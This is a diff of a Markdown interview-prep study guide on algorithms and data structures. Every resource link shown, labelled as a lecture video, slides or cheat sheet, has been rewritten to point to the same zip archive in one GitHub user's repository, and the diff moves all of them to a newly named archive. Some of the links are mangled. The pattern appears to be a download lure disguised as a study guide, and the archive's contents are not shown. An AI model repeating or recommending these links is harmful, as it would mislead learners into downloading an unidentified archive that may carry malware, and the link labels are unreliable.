     - See Nick White and FisherCoder Videos above for code walk-throughs.
-- [HackerRank](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [TopCoder](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Geeks for Geeks](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [InterviewBit](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Project Euler](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [HackerRank](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [TopCoder](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Geeks for Geeks](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [InterviewBit](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Project Euler](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ## Let's Get Started
 
@@ -588,18 +588,18 @@ But don't forget to do coding problems from above while you learn!
 - There are a lot of videos here. Just watch enough until you understand it. You can always come back and review.
 - Don't worry if you don't understand all the math behind it.
 - You just need to understand how to express the complexity of an algorithm in terms of Big-O.
-- [ ] [Harvard CS50 - Asymptotic Notation (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Big O Notations (general quick tutorial) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Big O Notation (and Omega and Theta) - best mathematical explanation (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [ ] [Harvard CS50 - Asymptotic Notation (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Big O Notations (general quick tutorial) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Big O Notation (and Omega and Theta) - best mathematical explanation (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 - [ ] Skiena:
-    - [video](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [slides](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [UC Berkeley Big O (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Amortized Analysis (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [video](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [slides](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [UC Berkeley Big O (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Amortized Analysis (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 - [ ] TopCoder (includes recurrence relations and master theorem):
-    - [Computational Complexity: Section 1](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Computational Complexity: Section 2](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Cheat sheet](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Computational Complexity: Section 1](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Computational Complexity: Section 2](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Cheat sheet](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 Well, that's about enough of that. 
 
@@ -610,10 +610,10 @@ if you can identify the runtime complexity of different algorithms. It's a super
 
 - ### Arrays
     - [ ] About Arrays:
-        - [Arrays (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [UC Berkeley CS61B - Linear and Multi-Dim Arrays (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip) (Start watching from 15m 32s)
-        - [Dynamic Arrays (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Jagged Arrays (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Arrays (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [UC Berkeley CS61B - Linear and Multi-Dim Arrays (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip) (Start watching from 15m 32s)
+        - [Dynamic Arrays (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Jagged Arrays (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Implement a vector (mutable array with automatic resizing):
         - [ ] Practice coding using arrays and pointers, and pointer math to jump to an index instead of using indexing.
         - [ ] New raw data array with allocated memory
@@ -642,19 +642,19 @@ if you can identify the runtime complexity of different algorithms. It's a super
 
 - ### Linked Lists
     - [ ] Description:
-        - [ ] [Singly Linked Lists (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [CS 61B - Linked Lists 1 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [CS 61B - Linked Lists 2 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [C Code (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [Singly Linked Lists (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [CS 61B - Linked Lists 1 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [CS 61B - Linked Lists 2 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [C Code (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
             - not the whole video, just portions about Node struct and memory allocation
     - [ ] Linked List vs Arrays:
-        - [Core Linked Lists Vs Arrays (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [In The Real World Linked Lists Vs Arrays (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [why you should avoid linked lists (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Core Linked Lists Vs Arrays (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [In The Real World Linked Lists Vs Arrays (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [why you should avoid linked lists (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Gotcha: you need pointer to pointer knowledge:
         (for when you pass a pointer to a function that may change the address where that pointer points)
         This page is just to get a grasp on ptr to ptr. I don't recommend this list traversal style. Readability and maintainability suffer due to cleverness.
-        - [Pointers to Pointers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip~https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Pointers to Pointers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip~https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Implement (I did with tail pointer & without):
         - [ ] size() - returns number of data elements in list
         - [ ] empty() - bool returns true if empty
@@ -671,16 +671,16 @@ if you can identify the runtime complexity of different algorithms. It's a super
         - [ ] reverse() - reverses the list
         - [ ] remove_value(value) - removes the first item in the list with this value
     - [ ] Doubly-linked List
-        - [Description (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Description (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
         - No need to implement
 
 - ### Stack
-    - [ ] [Stacks (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Stacks (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Will not implement. Implementing with array is trivial
 
 - ### Queue
-    - [ ] [Queue (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Circular buffer/FIFO](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Queue (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Circular buffer/FIFO](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Implement using linked-list, with tail pointer:
         - enqueue(value) - adds value at position at tail
         - dequeue() - returns value and removes least recently added element (front)
@@ -699,21 +699,21 @@ if you can identify the runtime complexity of different algorithms. It's a super
 
 - ### Hash table
     - [ ] Videos:
-        - [ ] [Hashing with Chaining (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Table Doubling, Karp-Rabin (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Open Addressing, Cryptographic Hashing (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [PyCon 2010: The Mighty Dictionary (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [PyCon 2017: The Dictionary Even Mightier (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [(Advanced) Randomization: Universal & Perfect Hashing (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [(Advanced) Perfect hashing (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [Hashing with Chaining (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Table Doubling, Karp-Rabin (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Open Addressing, Cryptographic Hashing (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [PyCon 2010: The Mighty Dictionary (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [PyCon 2017: The Dictionary Even Mightier (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [(Advanced) Randomization: Universal & Perfect Hashing (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [(Advanced) Perfect hashing (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
     - [ ] Online Courses:
-        - [ ] [Core Hash Tables (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Data Structures (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Phone Book Problem (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [Core Hash Tables (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Data Structures (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Phone Book Problem (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
         - [ ] distributed hash tables:
-            - [Instant Uploads And Storage Optimization In Dropbox (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-            - [Distributed Hash Tables (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+            - [Instant Uploads And Storage Optimization In Dropbox (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+            - [Distributed Hash Tables (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
     - [ ] Implement with array using linear probing
         - hash(k, m) - m is size of hash table
@@ -725,48 +725,48 @@ if you can identify the runtime complexity of different algorithms. It's a super
 ## More Knowledge
 
 - ### Binary search
-    - [ ] [Binary Search (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Binary Search (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [detail](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Binary Search (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Binary Search (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [detail](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Implement:
         - binary search (on sorted array of integers)
         - binary search using recursion
 
 - ### Bitwise operations
-    - [ ] [Bits cheat sheet](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip%https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip) - you should know many of the powers of 2 from (2^1 to 2^16 and 2^32)
+    - [ ] [Bits cheat sheet](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip%https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip) - you should know many of the powers of 2 from (2^1 to 2^16 and 2^32)
     - [ ] Get a really good understanding of manipulating bits with: &, |, ^, ~, >>, <<
-        - [ ] [words](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip(computer_architecture))
+        - [ ] [words](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip(computer_architecture))
         - [ ] Good intro:
-            [Bit Manipulation (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [C Programming Tutorial 2-10: Bitwise Operators (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Bit Manipulation](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Bitwise Operation](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Bithacks](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip~https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [The Bit Twiddler](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [The Bit Twiddler Interactive](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Bit Hacks (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-		- [ ] [Practice Operations](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+            [Bit Manipulation (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [C Programming Tutorial 2-10: Bitwise Operators (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Bit Manipulation](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Bitwise Operation](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Bithacks](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip~https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [The Bit Twiddler](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [The Bit Twiddler Interactive](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Bit Hacks (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+		- [ ] [Practice Operations](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] 2s and 1s complement
-        - [Binary: Plusses & Minuses (Why We Use Two's Complement) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [1s Complement](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip%27_complement)
-        - [2s Complement](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip%27s_complement)
+        - [Binary: Plusses & Minuses (Why We Use Two's Complement) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [1s Complement](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip%27_complement)
+        - [2s Complement](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip%27s_complement)
     - [ ] Count set bits
-        - [4 ways to count bits in a byte (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Count Bits](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip~https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [How To Count The Number Of Set Bits In a 32 Bit Integer](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [4 ways to count bits in a byte (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Count Bits](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip~https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [How To Count The Number Of Set Bits In a 32 Bit Integer](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Swap values:
-        - [Swap](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Swap](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Absolute value:
-        - [Absolute Integer](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Absolute Integer](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ## Trees
 
 - ### Trees - Notes & Background
-    - [ ] [Series: Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Series: Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - basic tree construction
     - traversal
     - manipulation algorithms
-    - [ ] [BFS(breadth-first search) and DFS(depth-first search) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [BFS(breadth-first search) and DFS(depth-first search) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
         - BFS notes:
            - level order (BFS, using queue)
            - time complexity: O(n)
@@ -781,20 +781,20 @@ if you can identify the runtime complexity of different algorithms. It's a super
             - preorder (DFS: self, left, right)
 
 - ### Binary search trees: BSTs
-    - [ ] [Binary Search Tree Review (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)    
-    - [ ] [Introduction (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [MIT (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Binary Search Tree Review (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)    
+    - [ ] [Introduction (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [MIT (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - C/C++:
-        - [ ] [Binary search tree - Implementation in C/C++ (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [BST implementation - memory allocation in stack and heap (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Find min and max element in a binary search tree (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Find height of a binary tree (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Binary tree traversal - breadth-first and depth-first strategies (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Binary tree: Level Order Traversal (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Binary tree traversal: Preorder, Inorder, Postorder (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Check if a binary tree is binary search tree or not (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Delete a node from Binary Search Tree (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Inorder Successor in a binary search tree (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [Binary search tree - Implementation in C/C++ (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [BST implementation - memory allocation in stack and heap (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Find min and max element in a binary search tree (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Find height of a binary tree (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Binary tree traversal - breadth-first and depth-first strategies (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Binary tree: Level Order Traversal (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Binary tree traversal: Preorder, Inorder, Postorder (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Check if a binary tree is binary search tree or not (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Delete a node from Binary Search Tree (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Inorder Successor in a binary search tree (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Implement:
         - [ ] insert    // insert value into tree
         - [ ] get_node_count // get count of values stored
@@ -810,20 +810,20 @@ if you can identify the runtime complexity of different algorithms. It's a super
 
 - ### Heap / Priority Queue / Binary Heap
     - visualized as a tree, but is usually linear in storage (array, linked list)
-    - [ ] [Heap](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip(data_structure))
-    - [ ] [Introduction (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Naive Implementations (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Binary Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Tree Height Remark (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Basic Operations (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Complete Binary Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Pseudocode (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Heap Sort - jumps to start (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Heap Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Building a heap (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [MIT: Heaps and Heap Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [CS 61B Lecture 24: Priority Queues (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Linear Time BuildHeap (max-heap)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Heap](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip(data_structure))
